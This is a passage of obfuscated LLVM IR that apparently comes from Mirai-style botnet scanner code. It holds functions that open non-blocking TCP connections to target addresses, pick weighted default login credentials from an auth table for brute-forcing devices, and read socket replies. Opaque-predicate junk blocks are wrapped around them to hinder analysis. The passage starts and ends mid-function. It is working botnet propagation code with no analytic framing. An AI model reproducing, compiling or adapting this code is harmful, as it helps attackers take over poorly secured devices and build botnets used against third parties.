  %5547 = load i8, i8* %12, align 1
  %5548 = zext i8 %5547 to i32
  %5549 = icmp slt i32 %5548, 255
  br label %originalBB354

originalBB358alteredBB:                           ; preds = %originalBB358, %2615
  %5550 = load i8, i8* %12, align 1
  %5551 = zext i8 %5550 to i32
  %5552 = icmp sge i32 %5551, 1
  br label %originalBB358

originalBB362alteredBB:                           ; preds = %originalBB362, %2639
  %5553 = load i8, i8* %10, align 1
  %5554 = zext i8 %5553 to i32
  %5555 = icmp eq i32 %5554, 67
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %2659
  %5556 = load i8, i8* %11, align 1
  %5557 = zext i8 %5556 to i32
  %5558 = icmp eq i32 %5557, 207
  br label %originalBB366

originalBB370alteredBB:                           ; preds = %originalBB370, %2691
  %5559 = load i8, i8* %11, align 1
  %5560 = zext i8 %5559 to i32
  %5561 = icmp eq i32 %5560, 205
  br label %originalBB370

originalBB374alteredBB:                           ; preds = %originalBB374, %2711
  %5562 = load i8, i8* %12, align 1
  %5563 = zext i8 %5562 to i32
  %5564 = icmp sge i32 %5563, 128
  br label %originalBB374

originalBB378alteredBB:                           ; preds = %originalBB378, %2735
  %5565 = load i8, i8* %10, align 1
  %5566 = zext i8 %5565 to i32
  %5567 = icmp eq i32 %5566, 80
  br label %originalBB378

originalBB382alteredBB:                           ; preds = %originalBB382, %2759
  %5568 = load i8, i8* %12, align 1
  %5569 = zext i8 %5568 to i32
  %5570 = icmp sge i32 %5569, 128
  br label %originalBB382

originalBB386alteredBB:                           ; preds = %originalBB386, %2779
  %5571 = load i8, i8* %12, align 1
  %5572 = zext i8 %5571 to i32
  %5573 = icmp slt i32 %5572, 143
  br label %originalBB386

originalBB390alteredBB:                           ; preds = %originalBB390, %2803
  %5574 = load i8, i8* %11, align 1
  %5575 = zext i8 %5574 to i32
  %5576 = icmp eq i32 %5575, 196
  br label %originalBB390

originalBB394alteredBB:                           ; preds = %originalBB394, %2827
  %5577 = load i8, i8* %12, align 1
  %5578 = zext i8 %5577 to i32
  %5579 = icmp slt i32 %5578, 15
  br label %originalBB394

originalBB398alteredBB:                           ; preds = %originalBB398, %2847
  %5580 = load i8, i8* %10, align 1
  %5581 = zext i8 %5580 to i32
  %5582 = icmp eq i32 %5581, 95
  br label %originalBB398

originalBB402alteredBB:                           ; preds = %originalBB402, %2867
  %5583 = load i8, i8* %11, align 1
  %5584 = zext i8 %5583 to i32
  %5585 = icmp eq i32 %5584, 85
  br label %originalBB402

originalBB406alteredBB:                           ; preds = %originalBB406, %2903
  %5586 = load i8, i8* %12, align 1
  %5587 = zext i8 %5586 to i32
  %5588 = icmp sge i32 %5587, 32
  br label %originalBB406

originalBB410alteredBB:                           ; preds = %originalBB410, %2939
  %5589 = load i8, i8* %12, align 1
  %5590 = zext i8 %5589 to i32
  %5591 = icmp slt i32 %5590, 223
  br label %originalBB410

originalBB414alteredBB:                           ; preds = %originalBB414, %2979
  %5592 = load i8, i8* %11, align 1
  %5593 = zext i8 %5592 to i32
  %5594 = icmp eq i32 %5593, 222
  br label %originalBB414

originalBB418alteredBB:                           ; preds = %originalBB418, %3007
  %5595 = load i8, i8* %10, align 1
  %5596 = zext i8 %5595 to i32
  %5597 = icmp eq i32 %5596, 208
  br label %originalBB418

originalBB422alteredBB:                           ; preds = %originalBB422, %3055
  %5598 = load i8, i8* %10, align 1
  %5599 = zext i8 %5598 to i32
  %5600 = icmp eq i32 %5599, 45
  br label %originalBB422

originalBB426alteredBB:                           ; preds = %originalBB426, %3075
  %5601 = load i8, i8* %11, align 1
  %5602 = zext i8 %5601 to i32
  %5603 = icmp eq i32 %5602, 63
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %3095
  %5604 = load i8, i8* %12, align 1
  %5605 = zext i8 %5604 to i32
  %5606 = icmp sge i32 %5605, 1
  br label %originalBB430

originalBB434alteredBB:                           ; preds = %originalBB434, %3123
  %5607 = load i8, i8* %11, align 1
  %5608 = zext i8 %5607 to i32
  %5609 = icmp eq i32 %5608, 237
  br label %originalBB434

originalBB438alteredBB:                           ; preds = %originalBB438, %3155
  %5610 = load i8, i8* %11, align 1
  %5611 = zext i8 %5610 to i32
  %5612 = icmp eq i32 %5611, 61
  br label %originalBB438

originalBB442alteredBB:                           ; preds = %originalBB442, %3175
  %5613 = load i8, i8* %10, align 1
  %5614 = zext i8 %5613 to i32
  %5615 = icmp eq i32 %5614, 45
  br label %originalBB442

originalBB446alteredBB:                           ; preds = %originalBB446, %3195
  %5616 = load i8, i8* %11, align 1
  %5617 = zext i8 %5616 to i32
  %5618 = icmp eq i32 %5617, 76
  br label %originalBB446

originalBB450alteredBB:                           ; preds = %originalBB450, %3219
  %5619 = load i8, i8* %11, align 1
  %5620 = zext i8 %5619 to i32
  %5621 = icmp eq i32 %5620, 11
  br label %originalBB450

originalBB454alteredBB:                           ; preds = %originalBB454, %3243
  %5622 = load i8, i8* %12, align 1
  %5623 = zext i8 %5622 to i32
  %5624 = icmp slt i32 %5623, 148
  br label %originalBB454

originalBB458alteredBB:                           ; preds = %originalBB458, %3267
  %5625 = load i8, i8* %11, align 1
  %5626 = zext i8 %5625 to i32
  %5627 = icmp eq i32 %5626, 56
  br label %originalBB458

originalBB462alteredBB:                           ; preds = %originalBB462, %3291
  %5628 = load i8, i8* %12, align 1
  %5629 = zext i8 %5628 to i32
  %5630 = icmp slt i32 %5629, 23
  br label %originalBB462

originalBB466alteredBB:                           ; preds = %originalBB466, %3343
  %5631 = load i8, i8* %10, align 1
  %5632 = zext i8 %5631 to i32
  %5633 = icmp eq i32 %5632, 66
  br label %originalBB466

originalBB470alteredBB:                           ; preds = %originalBB470, %3371
  %5634 = load i8, i8* %12, align 1
  %5635 = zext i8 %5634 to i32
  %5636 = icmp slt i32 %5635, 215
  br label %originalBB470

originalBB474alteredBB:                           ; preds = %originalBB474, %3403
  %5637 = load i8, i8* %12, align 1
  %5638 = zext i8 %5637 to i32
  %5639 = icmp slt i32 %5638, 139
  br label %originalBB474

originalBB478alteredBB:                           ; preds = %originalBB478, %3427
  %5640 = load i8, i8* %11, align 1
  %5641 = zext i8 %5640 to i32
  %5642 = icmp eq i32 %5641, 94
  br label %originalBB478

originalBB482alteredBB:                           ; preds = %originalBB482, %3447
  %5643 = load i8, i8* %12, align 1
  %5644 = zext i8 %5643 to i32
  %5645 = icmp sge i32 %5644, 237
  br label %originalBB482

originalBB486alteredBB:                           ; preds = %originalBB486, %3491
  %5646 = load i8, i8* %11, align 1
  %5647 = zext i8 %5646 to i32
  %5648 = icmp eq i32 %5647, 42
  br label %originalBB486

originalBB490alteredBB:                           ; preds = %originalBB490, %3511
  %5649 = load i8, i8* %12, align 1
  %5650 = zext i8 %5649 to i32
  %5651 = icmp sge i32 %5650, 73
  br label %originalBB490

originalBB494alteredBB:                           ; preds = %originalBB494, %3535
  %5652 = load i8, i8* %10, align 1
  %5653 = zext i8 %5652 to i32
  %5654 = icmp eq i32 %5653, 74
  br label %originalBB494

originalBB498alteredBB:                           ; preds = %originalBB498, %3555
  %5655 = load i8, i8* %11, align 1
  %5656 = zext i8 %5655 to i32
  %5657 = icmp eq i32 %5656, 91
  br label %originalBB498

originalBB502alteredBB:                           ; preds = %originalBB502, %3575
  %5658 = load i8, i8* %12, align 1
  %5659 = zext i8 %5658 to i32
  %5660 = icmp sge i32 %5659, 113
  br label %originalBB502

originalBB506alteredBB:                           ; preds = %originalBB506, %3599
  %5661 = load i8, i8* %10, align 1
  %5662 = zext i8 %5661 to i32
  %5663 = icmp eq i32 %5662, 74
  br label %originalBB506

originalBB510alteredBB:                           ; preds = %originalBB510, %3619
  %5664 = load i8, i8* %11, align 1
  %5665 = zext i8 %5664 to i32
  %5666 = icmp eq i32 %5665, 201
  br label %originalBB510

originalBB514alteredBB:                           ; preds = %originalBB514, %3639
  %5667 = load i8, i8* %12, align 1
  %5668 = zext i8 %5667 to i32
  %5669 = icmp sge i32 %5668, 56
  br label %originalBB514

originalBB518alteredBB:                           ; preds = %originalBB518, %3667
  %5670 = load i8, i8* %11, align 1
  %5671 = zext i8 %5670 to i32
  %5672 = icmp eq i32 %5671, 209
  br label %originalBB518

originalBB522alteredBB:                           ; preds = %originalBB522, %3707
  %5673 = load i8, i8* %11, align 1
  %5674 = zext i8 %5673 to i32
  %5675 = icmp eq i32 %5674, 202
  br label %originalBB522

originalBB526alteredBB:                           ; preds = %originalBB526, %3751
  %5676 = load i8, i8* %10, align 1
  %5677 = zext i8 %5676 to i32
  %5678 = icmp eq i32 %5677, 167
  br label %originalBB526

originalBB530alteredBB:                           ; preds = %originalBB530, %3775
  %5679 = load i8, i8* %10, align 1
  %5680 = zext i8 %5679 to i32
  %5681 = icmp eq i32 %5680, 178
  br label %originalBB530

originalBB534alteredBB:                           ; preds = %originalBB534, %3799
  %5682 = load i8, i8* %10, align 1
  %5683 = zext i8 %5682 to i32
  %5684 = icmp eq i32 %5683, 178
  br label %originalBB534

originalBB538alteredBB:                           ; preds = %originalBB538, %3819
  %5685 = load i8, i8* %11, align 1
  %5686 = zext i8 %5685 to i32
  %5687 = icmp eq i32 %5686, 33
  br label %originalBB538

originalBB542alteredBB:                           ; preds = %originalBB542, %3839
  %5688 = load i8, i8* %10, align 1
  %5689 = zext i8 %5688 to i32
  %5690 = icmp eq i32 %5689, 37
  br label %originalBB542

originalBB546alteredBB:                           ; preds = %originalBB546, %3859
  %5691 = load i8, i8* %11, align 1
  %5692 = zext i8 %5691 to i32
  %5693 = icmp eq i32 %5692, 59
  br label %originalBB546

originalBB550alteredBB:                           ; preds = %originalBB550, %3891
  %5694 = load i8, i8* %11, align 1
  %5695 = zext i8 %5694 to i32
  %5696 = icmp eq i32 %5695, 105
  br label %originalBB550

originalBB554alteredBB:                           ; preds = %originalBB554, %3915
  %5697 = load i8, i8* %11, align 1
  %5698 = zext i8 %5697 to i32
  %5699 = icmp eq i32 %5698, 254
  br label %originalBB554

originalBB558alteredBB:                           ; preds = %originalBB558, %3943
  %5700 = load i8, i8* %10, align 1
  %5701 = zext i8 %5700 to i32
  %5702 = icmp eq i32 %5701, 5
  br label %originalBB558

originalBB562alteredBB:                           ; preds = %originalBB562, %3963
  %5703 = load i8, i8* %11, align 1
  %5704 = zext i8 %5703 to i32
  %5705 = icmp eq i32 %5704, 135
  br label %originalBB562

originalBB566alteredBB:                           ; preds = %originalBB566, %3983
  %5706 = load i8, i8* %10, align 1
  %5707 = zext i8 %5706 to i32
  %5708 = icmp eq i32 %5707, 5
  br label %originalBB566

originalBB570alteredBB:                           ; preds = %originalBB570, %4023
  %5709 = load i8, i8* %10, align 1
  %5710 = zext i8 %5709 to i32
  %5711 = icmp eq i32 %5710, 104
  br label %originalBB570

originalBB574alteredBB:                           ; preds = %originalBB574, %4043
  %5712 = load i8, i8* %11, align 1
  %5713 = zext i8 %5712 to i32
  %5714 = icmp eq i32 %5713, 200
  br label %originalBB574

originalBB578alteredBB:                           ; preds = %originalBB578, %4071
  %5715 = load i8, i8* %10, align 1
  %5716 = zext i8 %5715 to i32
  %5717 = icmp eq i32 %5716, 107
  br label %originalBB578

originalBB582alteredBB:                           ; preds = %originalBB582, %4107
  %5718 = load i8, i8* %11, align 1
  %5719 = zext i8 %5718 to i32
  %5720 = icmp eq i32 %5719, 181
  br label %originalBB582

originalBB586alteredBB:                           ; preds = %originalBB586, %4179
  %5721 = load i8, i8* %12, align 1
  %5722 = zext i8 %5721 to i32
  %5723 = icmp slt i32 %5722, 143
  br label %originalBB586

originalBB590alteredBB:                           ; preds = %originalBB590, %4199
  %5724 = load i8, i8* %10, align 1
  %5725 = zext i8 %5724 to i32
  %5726 = icmp eq i32 %5725, 192
  br label %originalBB590

originalBB594alteredBB:                           ; preds = %originalBB594, %4219
  %5727 = load i8, i8* %11, align 1
  %5728 = zext i8 %5727 to i32
  %5729 = icmp eq i32 %5728, 252
  br label %originalBB594

originalBB598alteredBB:                           ; preds = %originalBB598, %4239
  %5730 = load i8, i8* %12, align 1
  %5731 = zext i8 %5730 to i32
  %5732 = icmp sge i32 %5731, 208
  br label %originalBB598

originalBB602alteredBB:                           ; preds = %originalBB602, %4275
  %5733 = load i8, i8* %12, align 1
  %5734 = zext i8 %5733 to i32
  %5735 = icmp slt i32 %5734, 59
  br label %originalBB602

originalBB606alteredBB:                           ; preds = %originalBB606, %4299
  %5736 = load i8, i8* %11, align 1
  %5737 = zext i8 %5736 to i32
  %5738 = icmp eq i32 %5737, 8
  br label %originalBB606

originalBB610alteredBB:                           ; preds = %originalBB610, %4323
  %5739 = load i8, i8* %12, align 1
  %5740 = zext i8 %5739 to i32
  %5741 = icmp slt i32 %5740, 95
  br label %originalBB610

originalBB614alteredBB:                           ; preds = %originalBB614, %4355
  %5742 = load i8, i8* %12, align 1
  %5743 = zext i8 %5742 to i32
  %5744 = icmp slt i32 %5743, 119
  br label %originalBB614

originalBB618alteredBB:                           ; preds = %originalBB618, %4379
  %5745 = load i8, i8* %11, align 1
  %5746 = zext i8 %5745 to i32
  %5747 = icmp eq i32 %5746, 229
  br label %originalBB618

originalBB622alteredBB:                           ; preds = %originalBB622, %4431
  %5748 = load i8, i8* %12, align 1
  %5749 = zext i8 %5748 to i32
  %5750 = icmp sge i32 %5749, 184
  br label %originalBB622

originalBB626alteredBB:                           ; preds = %originalBB626, %4451
  %5751 = load i8, i8* %12, align 1
  %5752 = zext i8 %5751 to i32
  %5753 = icmp slt i32 %5752, 187
  br label %originalBB626

originalBB630alteredBB:                           ; preds = %originalBB630, %4491
  %5754 = load i8, i8* %11, align 1
  %5755 = zext i8 %5754 to i32
  %5756 = icmp eq i32 %5755, 78
  br label %originalBB630

originalBB634alteredBB:                           ; preds = %originalBB634, %4539
  %5757 = load i8, i8* %11, align 1
  %5758 = zext i8 %5757 to i32
  %5759 = icmp eq i32 %5758, 71
  br label %originalBB634

originalBB638alteredBB:                           ; preds = %originalBB638, %4563
  %5760 = load i8, i8* %12, align 1
  %5761 = zext i8 %5760 to i32
  %5762 = icmp slt i32 %5761, 255
  br label %originalBB638

originalBB642alteredBB:                           ; preds = %originalBB642, %4587
  %5763 = load i8, i8* %11, align 1
  %5764 = zext i8 %5763 to i32
  %5765 = icmp eq i32 %5764, 142
  br label %originalBB642

originalBB646alteredBB:                           ; preds = %originalBB646, %4611
  %5766 = load i8, i8* %12, align 1
  %5767 = zext i8 %5766 to i32
  %5768 = icmp slt i32 %5767, 223
  br label %originalBB646

originalBB650alteredBB:                           ; preds = %originalBB650, %4643
  %5769 = load i8, i8* %10, align 1
  %5770 = zext i8 %5769 to i32
  %5771 = icmp eq i32 %5770, 35
  br label %originalBB650

originalBB654alteredBB:                           ; preds = %originalBB654, %4667
  %5772 = load i8, i8* %11, align 1
  %5773 = zext i8 %5772 to i32
  %5774 = icmp slt i32 %5773, 183
  br label %originalBB654

originalBB658alteredBB:                           ; preds = %originalBB658, %4703
  %5775 = load i8, i8* %11, align 1
  %5776 = zext i8 %5775 to i32
  %5777 = icmp sge i32 %5776, 95
  br label %originalBB658

originalBB662alteredBB:                           ; preds = %originalBB662, %4727
  %5778 = load i8, i8* %10, align 1
  %5779 = zext i8 %5778 to i32
  %5780 = icmp eq i32 %5779, 54
  br label %originalBB662

originalBB666alteredBB:                           ; preds = %originalBB666, %4755
  %5781 = load i8, i8* %10, align 1
  %5782 = zext i8 %5781 to i32
  %5783 = icmp eq i32 %5782, 54
  br label %originalBB666

originalBB670alteredBB:                           ; preds = %originalBB670, %4775
  %5784 = load i8, i8* %11, align 1
  %5785 = zext i8 %5784 to i32
  %5786 = icmp sge i32 %5785, 144
  br label %originalBB670

originalBB674alteredBB:                           ; preds = %originalBB674, %4795
  %5787 = load i8, i8* %11, align 1
  %5788 = zext i8 %5787 to i32
  %5789 = icmp slt i32 %5788, 255
  br label %originalBB674

originalBB678alteredBB:                           ; preds = %originalBB678, %4815
  %5790 = load i8, i8* %10, align 1
  %5791 = zext i8 %5790 to i32
  %5792 = icmp eq i32 %5791, 13
  br label %originalBB678

originalBB682alteredBB:                           ; preds = %originalBB682, %4851
  %5793 = load i8, i8* %11, align 1
  %5794 = zext i8 %5793 to i32
  %5795 = icmp slt i32 %5794, 115
  br label %originalBB682

originalBB686alteredBB:                           ; preds = %originalBB686, %4871
  %5796 = load i8, i8* %10, align 1
  %5797 = zext i8 %5796 to i32
  %5798 = icmp eq i32 %5797, 163
  br label %originalBB686

originalBB690alteredBB:                           ; preds = %originalBB690, %4919
  %5799 = load i8, i8* %12, align 1
  %5800 = zext i8 %5799 to i32
  %5801 = icmp slt i32 %5800, 255
  br label %originalBB690

originalBB694alteredBB:                           ; preds = %originalBB694, %4951
  %5802 = load i8, i8* %12, align 1
  %5803 = zext i8 %5802 to i32
  %5804 = icmp slt i32 %5803, 255
  br label %originalBB694

originalBB698alteredBB:                           ; preds = %originalBB698, %4971
  %5805 = load i8, i8* %10, align 1
  %5806 = zext i8 %5805 to i32
  %5807 = icmp eq i32 %5806, 89
  br label %originalBB698

originalBB702alteredBB:                           ; preds = %originalBB702, %4991
  %5808 = load i8, i8* %11, align 1
  %5809 = zext i8 %5808 to i32
  %5810 = icmp eq i32 %5809, 34
  br label %originalBB702

originalBB706alteredBB:                           ; preds = %originalBB706, %5015
  %5811 = load i8, i8* %12, align 1
  %5812 = zext i8 %5811 to i32
  %5813 = icmp slt i32 %5812, 97
  br label %originalBB706

originalBB710alteredBB:                           ; preds = %originalBB710, %5039
  %5814 = load i8, i8* %11, align 1
  %5815 = zext i8 %5814 to i32
  %5816 = icmp sge i32 %5815, 216
  br label %originalBB710

originalBB714alteredBB:                           ; preds = %originalBB714, %5075
  %5817 = load i8, i8* %10, align 1
  %5818 = zext i8 %5817 to i32
  %5819 = icmp eq i32 %5818, 178
  br label %originalBB714

originalBB718alteredBB:                           ; preds = %originalBB718, %5131
  %5820 = load i8, i8* %11, align 1
  %5821 = zext i8 %5820 to i32
  %5822 = icmp sge i32 %5821, 97
  br label %originalBB718

originalBB722alteredBB:                           ; preds = %originalBB722, %5155
  %5823 = load i8, i8* %10, align 1
  %5824 = zext i8 %5823 to i32
  %5825 = icmp eq i32 %5824, 86
  br label %originalBB722

originalBB726alteredBB:                           ; preds = %originalBB726, %5175
  %5826 = load i8, i8* %11, align 1
  %5827 = zext i8 %5826 to i32
  %5828 = icmp eq i32 %5827, 208
  br label %originalBB726

originalBB730alteredBB:                           ; preds = %originalBB730, %5231
  %5829 = load i8, i8* %10, align 1
  %5830 = zext i8 %5829 to i32
  %5831 = icmp eq i32 %5830, 78
  br label %originalBB730
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %59

; <label>:21:                                     ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %37, i32 0, i32 4
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 5
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @fake_time, align 4
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 2
  store i32 %46, i32* %48, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 3
  store i32 1, i32* %50, align 8
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 1
  %53 = load i32, i32* %52, align 8
  %54 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %55 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %55, %struct.sockaddr** %54, align 8
  %56 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %57 = load %struct.sockaddr*, %struct.sockaddr** %56, align 8
  %58 = call i32 @connect(i32 %53, %struct.sockaddr* %57, i32 16)
  br label %59

; <label>:59:                                     ; preds = %21, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set.18*, %struct.fd_set.18*, %struct.fd_set.18*, %struct.timeval.19*) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %46

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %47

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %2, align 4
  br label %9

; <label>:46:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %47

; <label>:47:                                     ; preds = %46, %36
  %48 = load i32, i32* @x.61
  %49 = load i32, i32* @y.62
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %47
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  %57 = load i32, i32* @x.61
  %58 = load i32, i32* @y.62
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret %struct.scanner_auth* %56

originalBBalteredBB:                              ; preds = %originalBB, %47
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %107

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %originalBBpart223, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %90

; <label>:25:                                     ; preds = %21
  %26 = load i32, i32* @x.63
  %27 = load i32, i32* @y.64
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = icmp eq i32 %39, 0
  %41 = load i32, i32* @x.63
  %42 = load i32, i32* @y.64
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %49, label %70

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.63
  %51 = load i32, i32* @y.64
